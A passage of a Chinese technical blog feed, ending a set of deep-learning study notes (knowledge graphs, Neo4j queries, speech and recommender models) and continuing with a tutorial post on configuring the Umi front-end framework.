href="#15-bert" class="headerlink" title="15.bert"></a>15.bert</h3><h3 id="16-知识图谱"><a href="#16-知识图谱" class="headerlink" title="16. 知识图谱"></a>16. 知识图谱</h3><p>应用领域：</p><ul><li>搜索引擎</li><li>医疗查询（智能问答助手、辅助决策）</li><li>金融：反欺诈</li><li>推荐系统</li></ul><p>数据从哪里来：一段话：抽取实体、语义标签、二元关系、多元关系、事件</p><p>大量设计nlp技术</p><p>关系做得准确才可靠</p><p>常用技术点</p><ul><li><p>命名实体识别</p></li><li><p>给词打上标签</p></li><li><p>将标签和意图转换成sql</p></li><li><p>基于实体与关系构建知识图谱网络图（关系抽取）</p></li><li><p>实体统一 &#x2F; 指代消解</p></li></ul><p>Graph embedding</p><ul><li>风控模型中对节点进行编码</li><li>根据用户关系（通讯录）建立算法模型（Deep walk），获得用户向量</li><li>根据特征编码做预测分析</li><li>难点在于如何编码（算法）才能更准确体现这个用户的情况</li></ul><p>知识融合</p><ul><li>融合特征，得到最终的向量</li></ul><h4 id="图数据库：neo4j"><a href="#图数据库：neo4j" class="headerlink" title="图数据库：neo4j"></a>图数据库：neo4j</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs neo4j">Neo4j增删改查：<br><br>增：<br>增加一个节点<br>create (n:Person &#123;name:&#x27;我&#x27;,age:31&#125;)<br>带有关系属性<br>create (p:Person&#123;name:&quot;我&quot;,age:&quot;31&quot;&#125;)-[:包工程&#123;金额:10000&#125;]-&gt;(n:Person&#123;name:&quot;好大哥&quot;,age:&quot;35&quot;&#125;)<br><br>删<br>create (n:Person &#123;name:&#x27;TYD&#x27;,age:31&#125;)<br>match (n:Person&#123;name:&quot;TYD&quot;&#125;) delete n<br>删除关系<br>match (p:Person&#123;name:&quot;我&quot;,age:&quot;31&quot;&#125;)-[f:包工程]-&gt;(n:Person&#123;name:&quot;好大哥&quot;,age:&quot;35&quot;&#125;)<br>delete f<br><br>改：<br>加上标签<br>match (t:Person) where id(t)=789 set t:好人return t<br>加上属性<br>match (a:好人) where id(a)=789 set a.战斗力=200 return a<br>修改属性<br>match (a:好人) where id(a)=789 set a.战斗力=500 return a<br><br>查：(查操作太多啦，直接参考neo4j例子就好)<br>match (p:Person) - [:包工程] -&gt; (n:Person) return p,n<br>快速清空数据库：<br>MATCH (n)<br>DETACH DELETE n<br></code></pre></td></tr></table></figure><blockquote><p>使用python操作neo4j示例：pandasDemo</p></blockquote><h4 id="基于知识图谱的医疗问答系统（可运行）"><a href="#基于知识图谱的医疗问答系统（可运行）" class="headerlink" title="基于知识图谱的医疗问答系统（可运行）"></a>基于知识图谱的医疗问答系统（可运行）</h4><blockquote><p>代码：QAmedicalKG</p><p>运行：build_medicalgraph -&gt; chatbot_graph</p></blockquote><h4 id="文本数据关系抽取"><a href="#文本数据关系抽取" class="headerlink" title="文本数据关系抽取"></a>文本数据关系抽取</h4><blockquote><p>代码：Extraction</p><p>参考：<a href="http://ltp.ai/index.html">http://ltp.ai/index.html</a></p></blockquote><p>依存句法</p><p>语义角色标注</p><h4 id="金融平台风控模型"><a href="#金融平台风控模型" class="headerlink" title="金融平台风控模型"></a>金融平台风控模型</h4><blockquote><p>来源竞赛：<a href="http://openresearch.rong360.com/#/">http://openresearch.rong360.com/#/</a></p></blockquote><p>deepwalk</p><h4 id="医学糖尿病数据命名实体识别"><a href="#医学糖尿病数据命名实体识别" class="headerlink" title="医学糖尿病数据命名实体识别"></a>医学糖尿病数据命名实体识别</h4><h3 id="17-语音识别"><a href="#17-语音识别" class="headerlink" title="17. 语音识别"></a>17. 语音识别</h3><h4 id="seq2seq-x2F-las模型"><a href="#seq2seq-x2F-las模型" class="headerlink" title="seq2seq&#x2F;las模型"></a>seq2seq&#x2F;las模型</h4><p>encoder - attation - decoder</p><p>teacher forching: 用true label传到下一个，以防错误传播</p><blockquote><p>LAS模型语音识别代码：LAS-Pytorch</p></blockquote><h4 id="语音分离-convtasnet"><a href="#语音分离-convtasnet" class="headerlink" title="语音分离 convtasnet"></a>语音分离 convtasnet</h4><p>输入为混合的声音，输出各个讲话者单独的声音</p><p>经典的Deep Clustering</p><ol><li>拿到声音信号</li><li>做embedding：每个点变成向量，当做一个样本</li><li>对当前样本做一个聚类（k-means等）</li><li>把得到的label结果当作mask矩阵即可，分离出来，就得到k个mask</li><li>用mask还原到原始数据，得到k个结果，分离结束</li></ol><p>Cons-TasNet</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20221015163640876-20221015%2016:36:41.png" alt="image-20221015163640876"></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20221015163712334-20221015%2016:37:12.png" alt="image-20221015163712334"></p><p>网络结构细节</p><ul><li>全卷积</li><li>更大的感受野：多次重复1-D卷积、空洞卷积、DW卷积（depthwise、pointwise）</li><li>纯语音输入输出</li><li>end to end</li></ul><blockquote><p>代码：Conv-TasNet</p></blockquote><h4 id="语音合成-tacotron"><a href="#语音合成-tacotron" class="headerlink" title="语音合成 tacotron"></a>语音合成 tacotron</h4><blockquote><p>地址：<a href="https://github.com/NVIDIA/tacotron2">https://github.com/NVIDIA/tacotron2</a></p><p>代码：语音合成tacotron2实战</p></blockquote><h3 id="18-推荐系统"><a href="#18-推荐系统" class="headerlink" title="18. 推荐系统"></a>18. 推荐系统</h3><h4 id="协同过滤与矩阵分解"><a href="#协同过滤与矩阵分解" class="headerlink" title="协同过滤与矩阵分解"></a>协同过滤与矩阵分解</h4><p>基于用户的协同过滤算法（算相似度）</p><p>基于物品的协同过滤算法（算相似度）</p><p>矩阵分解（让矩阵更容易）</p><p>矩阵分解中的隐式与显式情况解决思路</p><p>基于用户的协同过滤</p><ul><li>找到相似用户（相似度计算）</li><li>属性特征、行为特征等都可以当作计算输入</li><li>用的不多：用户多、数据稀疏、计算相似度矩阵较难、新用户问题</li></ul><p>基于物品的协同过滤</p><ul><li>先得到用户和商品的交互数据</li><li>经常被同时购买的商品</li><li>用的较多：商品种类比较少、属性比较固定、适合非实时场景</li></ul><p>矩阵分解</p><ul><li>推荐系统中用的最多的方法</li><li>User-item（m * n）分解为user（m * k）和item（k * n）两个矩阵</li></ul><p>隐向量：特征的高维表达</p><p>目标函数</p><ul><li><p>类似回归方程：$min_{X,Y}\sum_{r_{ui\neq0}}(r_{ui} - x_u^Ty_i)^2 + \lambda(\sum_u||x_u||^2_2 + \sum_i||y_i||^2_2)$</p></li><li><p>用户矩阵 X ，商品矩阵 Y</p></li><li><p>额外引入正则化惩罚项</p></li><li><p>再加入用户偏置项（bu）与商品偏置项（bi）</p></li></ul><p>隐式情况分析</p><ul><li><p>观看时间、点击次数等指标</p></li><li><p>定义置信度：$c_{ui} &#x3D; 1 + \alpha r_{ui}$</p></li><li><p>置信度默认为1，表示用户没有产生行为的商品；行为越多，置信度越大</p></li><li><p>重新定义评分：$$p_{ui} &#x3D; \begin{cases} 1&amp; {r_{ui} &gt; 0}\0&amp; {r_{ui} &#x3D; 0}\end{cases}$$</p></li><li><p>新的优化目标：$G(x_*,y_*) &#x3D; (\sum_{u,i}c_{ui}(p_{ui}-x_u^Ty_i)^2) + \lambda(\sum_u||x_u||^2 + \sum_i||y_i||^2)$</p></li><li><p>总结就是置信度越大，预测得越准</p></li><li><p>求解过程交替使用最小二乘法，先固定y优化x，再固定x优化y</p></li></ul><p>Embedding</p><ul><li><p>兴趣标签</p></li><li><p>用户画像</p></li><li><p>行为序列（点击历史）</p></li></ul><h4 id="fm与deepfm"><a href="#fm与deepfm" class="headerlink" title="fm与deepfm"></a>fm与deepfm</h4><h4 id="常用工具包"><a href="#常用工具包" class="headerlink" title="常用工具包"></a>常用工具包</h4><h3 id="19-diffusion-model"><a href="#19-diffusion-model" class="headerlink" title="19. diffusion model"></a>19. diffusion model</h3>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>深度学习</tag>
      
      <tag>论文</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>umi基础</title>
    <link href="/blog/2022/11/28/umi/"/>
    <url>/blog/2022/11/28/umi/</url>
    
    <content type="html"><![CDATA[<h1 id="Umi"><a href="#Umi" class="headerlink" title="Umi"></a>Umi</h1><p>Umi，中文可发音为<strong>乌米</strong>，是可扩展的企业级前端应用框架。Umi 以路由为基础的，同时支持配置式路由和约定式路由，保证路由的功能完备，并以此进行功能扩展。然后配以生命周期完善的插件体系，覆盖从源码到构建产物的每个生命周期，支持各种功能扩展和业务需求。</p><p>Umi 是蚂蚁集团的底层前端框架，已直接或间接地服务了 3000+ 应用，包括 java、node、H5 无线、离线（Hybrid）应用、纯前端 assets 应用、CMS 应用等。他已经很好地服务了我们的内部用户，同时希望他也能服务好外部用户。</p><p>它主要具备以下功能：</p><ul><li>🎉 <strong>可扩展</strong>，Umi 实现了完整的生命周期，并使其插件化，Umi 内部功能也全由插件完成。此外还支持插件和插件集，以满足功能和垂直域的分层需求。</li><li>📦 <strong>开箱即用</strong>，Umi 内置了路由、构建、部署、测试等，仅需一个依赖即可上手开发。并且还提供针对 React 的集成插件集，内涵丰富的功能，可满足日常 80% 的开发需求。</li><li>🐠 <strong>企业级</strong>，经蚂蚁内部 3000+ 项目以及阿里、优酷、网易、飞猪、口碑等公司项目的验证，值得信赖。</li><li>🚀 <strong>大量自研</strong>，包含微前端、组件打包、文档工具、请求库、hooks 库、数据流等，满足日常项目的周边需求。</li><li>🌴 <strong>完备路由</strong>，同时支持配置式路由和约定式路由，同时保持功能的完备性，比如动态路由、嵌套路由、权限路由等等。</li><li>🚄 <strong>面向未来</strong>，在满足需求的同时，我们也不会停止对新技术的探索。比如 dll 提速、modern mode、webpack@5、自动化 external、bundler less 等等。</li></ul><h2 id="umi-临时文件"><a href="#umi-临时文件" class="headerlink" title=".umi 临时文件"></a>.umi 临时文件</h2><p>.umi 临时目录是整个 Umi 项目的发动机，你的入口文件、路由等等都在这里，这些是由 umi 内部插件及三方插件生成的。</p><p>你通常会在 .umi 下看到以下目录，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">+ .umi<br>  + core     <span class="hljs-comment"># 内部插件生成</span><br>  + pluginA  <span class="hljs-comment"># 外部插件生成</span><br>  + presetB  <span class="hljs-comment"># 外部插件生成</span><br>  + umi.ts   <span class="hljs-comment"># 入口文件</span><br></code></pre></td></tr></table></figure><p>临时文件是 Umi 框架中非常重要的一部分，框架或插件会根据你的代码生成临时文件，这些原来需要放在项目里的脏乱差的部分都被藏在了这里。</p><p>你可以在这里调试代码，但不要在 .git 仓库里提交他，因为他的临时性，每次启动 umi 时都会被删除并重新生成。</p><h2 id="部署发布"><a href="#部署发布" class="headerlink" title="部署发布"></a>部署发布</h2><h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ yarn build<br>✔ Webpack  Compiled successfully <span class="hljs-keyword">in</span> 17.17s<br> DONE  Compiled successfully <span class="hljs-keyword">in</span> 17167ms                                       8:26:25 PM<br>Build success.✨  Done <span class="hljs-keyword">in</span> 20.79s.<br></code></pre></td></tr></table></figure><p>构建产物默认生成到 <code>./dist</code> 下，然后通过 tree 命令查看，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tree ./dist<br>./dist├── index.html├── umi.css└── umi.js<br></code></pre></td></tr></table></figure><h3 id="本地验证"><a href="#本地验证" class="headerlink" title="本地验证"></a>本地验证</h3><p>发布之前，可以通过 <code>serve</code> 做本地验证，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ yarn global add serve$ serve ./dist<br>   ┌────────────────────────────────────────────────────┐   │                                                    │   │   Serving!                                         │   │                                                    │   │   - Local:            http://localhost:5000        │   │   - On Your Network:  http://192.168.12.34:5000    │   │                                                    │   │   Copied <span class="hljs-built_in">local</span> address to clipboard!               │   │                                                    │   └────────────────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><p>访问 <a href="http://localhost:5000/">http://localhost:5000</a>，正常情况下应该是和执行 <code>yarn start</code> 时是一致的。</p><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>本地验证完，就可以部署了。你需要把 <code>dist</code> 目录部署到服务器上。</p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>一个基础的 Umi 项目大致是这样的，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs unknown">.<br>├── package.json<br>├── .umirc.ts<br>├── .env<br>├── dist<br>├── mock<br>├── public<br>└── src<br>    ├── .umi<br>    ├── layouts/index.tsx<br>    ├── pages<br>        ├── index.less<br>        └── index.tsx<br>    └── app.ts<br></code></pre></td></tr></table></figure><h3 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h3><h4 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h4><p>包含插件和插件集，以 <code>@umijs/preset-</code>、<code>@umijs/plugin-</code>、<code>umi-preset-</code> 和 <code>umi-plugin-</code> 开头的依赖会被自动注册为插件或插件集。</p><h4 id="umirc-ts"><a href="#umirc-ts" class="headerlink" title=".umirc.ts"></a>.umirc.ts</h4><p>配置文件，包含 umi 内置功能和插件的配置。</p><h4 id="env"><a href="#env" class="headerlink" title=".env"></a>.env</h4><p>环境变量。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs unknown">PORT=8888<br>COMPRESS=none<br></code></pre></td></tr></table></figure><h4 id="dist-目录"><a href="#dist-目录" class="headerlink" title="dist 目录"></a>dist 目录</h4><p>执行 <code>umi build</code> 后，产物默认会存放在这里。</p><h4 id="mock-目录"><a href="#mock-目录" class="headerlink" title="mock 目录"></a>mock 目录</h4><p>存储 mock 文件，此目录下所有 js 和 ts 文件会被解析为 mock 文件。</p><h4 id="public-目录"><a href="#public-目录" class="headerlink" title="public 目录"></a>public 目录</h4><p>此目录下所有文件会被 copy 到输出路径。</p><h3 id="src-目录"><a href="#src-目录" class="headerlink" title="/src 目录"></a><code>/src</code> 目录</h3><h4 id="umi-目录"><a href="#umi-目录" class="headerlink" title=".umi 目录"></a>.umi 目录</h4><p>临时文件目录，比如入口文件、路由等，都会被临时生成到这里。<strong>不要提交 .umi 目录到 git 仓库，他们会在 umi dev 和 umi build 时被删除并重新生成。</strong></p><h4 id="layouts-x2F-index-tsx"><a href="#layouts-x2F-index-tsx" class="headerlink" title="layouts&#x2F;index.tsx"></a>layouts&#x2F;index.tsx</h4><p>约定式路由时的全局布局文件。</p><h4 id="pages-目录"><a href="#pages-目录" class="headerlink" title="pages 目录"></a>pages 目录</h4><p>所有路由组件存放在这里。</p><h4 id="app-ts"><a href="#app-ts" class="headerlink" title="app.ts"></a>app.ts</h4><p>运行时配置文件，可以在这里扩展运行时的能力，比如修改路由、修改 render 方法等。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Umi 在 <code>.umirc.ts</code> 或 <code>config/config.ts</code> 中配置项目和插件，支持 es6。一份常见的配置如下，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> default &#123;<br>  base: <span class="hljs-string">&#x27;/docs/&#x27;</span>,<br>  publicPath: <span class="hljs-string">&#x27;/static/&#x27;</span>,<br>  <span class="hljs-built_in">hash</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-built_in">history</span>: &#123;<br>    <span class="hljs-built_in">type</span>: <span class="hljs-string">&#x27;hash&#x27;</span>,<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>如果项目的配置不复杂，推荐在 <code>.umirc.ts</code> 中写配置； 如果项目的配置比较复杂，可以将配置写在 <code>config/config.ts</code> 中，并把配置的一部分拆分出去，比如路由配置可以拆分成单独的 <code>routes.ts</code>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// config/routes.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [    &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;index&#x27;</span> &#125;,];<br><span class="hljs-comment">// config/config.ts</span><br><span class="hljs-keyword">import</span> &#123; defineConfig &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;umi&#x27;</span>;<br><span class="hljs-keyword">import</span> routes <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./routes&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(&#123;  <br>    <span class="hljs-attr">routes</span>: routes,<br>&#125;);<br></code></pre></td></tr></table></figure><p>推荐两种配置方式二选一，<code>.umirc.ts</code> 优先级更高。</p><h3 id="TypeScript-提示"><a href="#TypeScript-提示" class="headerlink" title="TypeScript 提示"></a>TypeScript 提示</h3><p>如果你想在写配置时也有提示，可以通过 umi 的 <code>defineConfig</code> 方法定义配置，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; defineConfig &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;umi&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(&#123;  <br>    <span class="hljs-attr">routes</span>: [    <br>        &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/index&#x27;</span> &#125;,  <br>    ],<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://img.alicdn.com/tfs/TB1EV1pv.T1gK0jSZFhXXaAtVXa-1204-838.png" alt="img"></p><h3 id="本地临时配置"><a href="#本地临时配置" class="headerlink" title="本地临时配置"></a>本地临时配置</h3><p>可以新建 <code>.umirc.local.ts</code>，这份配置会和 <code>.umirc.ts</code> 做 deep merge 后形成最终配置。</p><blockquote><p>注：<code>.umirc.local.ts</code> 仅在 <code>umi dev</code> 时有效。<code>umi build</code> 时不会被加载。</p></blockquote><p>比如，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// .umirc.ts 或者 config/config.tsexport default &#123; a: 1, b: 2 &#125;;</span><br><span class="hljs-comment">// .umirc.local.ts 或者 config/config.local.tsexport default &#123; c: &#x27;local&#x27; &#125;;</span><br></code></pre></td></tr></table></figure><p>拿到的配置是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">b</span>: <span class="hljs-number">2</span>,<br>  <span class="hljs-attr">c</span>: <span class="hljs-string">&#x27;local&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li><code>config/config.ts</code> 对应的是 <code>config/config.local.ts</code></li><li><code>.local.ts</code> 是本地验证使用的临时配置，请将其添加到 <code>.gitignore</code>，<strong>务必不要提交到 git 仓库中</strong></li><li><code>.local.ts</code> 配置的优先级最高，比 <code>UMI_ENV</code> 指定的配置更高</li></ul><h3 id="多环境多份配置"><a href="#多环境多份配置" class="headerlink" title="多环境多份配置"></a>多环境多份配置</h3><p>可以通过环境变量 <code>UMI_ENV</code> 区分不同环境来指定配置。</p><p>举个例子，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// .umirc.js 或者 config/config.jsexport default &#123; a: 1, b: 2 &#125;;</span><br><span class="hljs-comment">// .umirc.cloud.js 或者 config/config.cloud.jsexport default &#123; b: &#x27;cloud&#x27;, c: &#x27;cloud&#x27; &#125;;</span><br><span class="hljs-comment">// .umirc.local.js 或者 config/config.local.jsexport default &#123; c: &#x27;local&#x27; &#125;;</span><br></code></pre></td></tr></table></figure><p>不指定 <code>UMI_ENV</code> 时，拿到的配置是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">b</span>: <span class="hljs-number">2</span>,<br>  <span class="hljs-attr">c</span>: <span class="hljs-string">&#x27;local&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>指定 <code>UMI_ENV=cloud</code> 时，拿到的配置是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">b</span>: <span class="hljs-string">&#x27;cloud&#x27;</span>,<br>  <span class="hljs-attr">c</span>: <span class="hljs-string">&#x27;local&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行时配置"><a href="#运行时配置" class="headerlink" title="运行时配置"></a>运行时配置</h2><p>运行时配置和配置的区别是他跑在浏览器端，基于此，我们可以在这里写函数、jsx、import 浏览器端依赖等等，注意不要引入 node 依赖。</p><h3 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h3><p>约定 <code>src/app.tsx</code> 为运行时配置。</p><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><h5 id="modifyClientRenderOpts-fn"><a href="#modifyClientRenderOpts-fn" class="headerlink" title="modifyClientRenderOpts(fn)"></a>modifyClientRenderOpts(fn)</h5><p>修改 clientRender 参数。</p><p>比如在微前端里动态修改渲染根节点：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> isSubApp = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">modifyClientRenderOpts</span>(<span class="hljs-params">memo</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    ...memo,<br>    <span class="hljs-attr">rootElement</span>: isSubApp ? <span class="hljs-string">&#x27;sub-root&#x27;</span> : memo.<span class="hljs-property">rootElement</span>,    <br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="patchRoutes-routes"><a href="#patchRoutes-routes" class="headerlink" title="patchRoutes({ routes })"></a>patchRoutes({ routes })</h5><p>修改路由。</p><p>比如在最前面添加一个 <code>/foo</code> 路由，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> <span class="hljs-keyword">function</span> patchRoutes(&#123; routes &#125;) &#123;<br>  routes.unshift(&#123;<br>    path: <span class="hljs-string">&#x27;/foo&#x27;</span>,<br>    exact: <span class="hljs-literal">true</span>,<br>    component: require(<span class="hljs-string">&#x27;@/extraRoutes/foo&#x27;</span>).default,<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>比如和 <code>render</code> 配置配合使用，请求服务端根据响应动态更新路由，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> extraRoutes;<br><span class="hljs-built_in">export</span> <span class="hljs-keyword">function</span> patchRoutes(&#123; routes &#125;) &#123;  merge(routes, extraRoutes);&#125;<br><span class="hljs-built_in">export</span> <span class="hljs-keyword">function</span> render(oldRender) &#123;  fetch(<span class="hljs-string">&#x27;/api/routes&#x27;</span>).<span class="hljs-keyword">then</span>(res=&gt;res.json()).<span class="hljs-keyword">then</span>((res) =&gt; &#123;     extraRoutes = res.routes;    oldRender();  &#125;)&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>直接修改routes，不需要返回</li></ul><h5 id="render-oldRender-Function"><a href="#render-oldRender-Function" class="headerlink" title="render(oldRender: Function)"></a>render(oldRender: Function)</h5><p>覆写 render。</p><p>比如用于渲染之前做权限校验，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import &#123; <span class="hljs-built_in">history</span> &#125; from <span class="hljs-string">&#x27;umi&#x27;</span>;<br><span class="hljs-built_in">export</span> <span class="hljs-keyword">function</span> render(oldRender) &#123;  fetch(<span class="hljs-string">&#x27;/api/auth&#x27;</span>).<span class="hljs-keyword">then</span>(auth =&gt; &#123;    <span class="hljs-keyword">if</span> (auth.isLogin) &#123; oldRender() &#125;    <span class="hljs-keyword">else</span> &#123;       history.push(<span class="hljs-string">&#x27;/login&#x27;</span>);       oldRender()    &#125;  &#125;);&#125;<br></code></pre></td></tr></table></figure><h5 id="onRouteChange-routes-matchedRoutes-location-action"><a href="#onRouteChange-routes-matchedRoutes-location-action" class="headerlink" title="onRouteChange({ routes, matchedRoutes, location, action })"></a>onRouteChange({ routes, matchedRoutes, location, action })</h5><p>在初始加载和路由切换时做一些事情。</p><p>比如用于做埋点统计，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> <span class="hljs-keyword">function</span> onRouteChange(&#123; location, routes, action &#125;) &#123;<br>  bacon(location.pathname);<br>&#125;<br></code></pre></td></tr></table></figure><p>比如用于设置标题，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> <span class="hljs-keyword">function</span> onRouteChange(&#123; matchedRoutes &#125;) &#123;<br>  <span class="hljs-keyword">if</span> (matchedRoutes.length) &#123;<br>    document.title = matchedRoutes[matchedRoutes.length - 1].route.title || <span class="hljs-string">&#x27;&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="rootContainer-LastRootContainer-args"><a href="#rootContainer-LastRootContainer-args" class="headerlink" title="rootContainer(LastRootContainer, args)"></a>rootContainer(LastRootContainer, args)</h5><p>修改交给 react-dom 渲染时的根组件。</p><p>比如用于在外面包一个 Provider，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> <span class="hljs-keyword">function</span> rootContainer(container) &#123;<br>  <span class="hljs-built_in">return</span> React.createElement(ThemeProvider, null, container);<br>&#125;<br></code></pre></td></tr></table></figure><p>args 包含：</p><ul><li>routes，全量路由配置</li><li>plugin，运行时插件机制</li><li>history，history 